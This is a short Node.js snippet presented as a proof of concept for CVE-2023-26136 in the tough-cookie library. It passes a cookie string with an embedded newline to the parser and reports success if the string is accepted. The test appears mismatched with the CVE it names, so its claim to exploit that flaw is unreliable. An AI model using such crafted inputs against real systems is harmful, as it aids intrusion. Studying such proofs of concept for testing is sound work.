const tough = require('tough-cookie');

// Example to exploit the vulnerability (CVE-2023-26136)
const cookieStr = 'name=value\nasd; HttpOnly';
const parsedCookie = tough.Cookie.parse(cookieStr);

if (parsedCookie) {
    console.log('EXPLOITED SUCCESSFULLY');
} else {
    console.log('EXPLOIT FAILED');
}
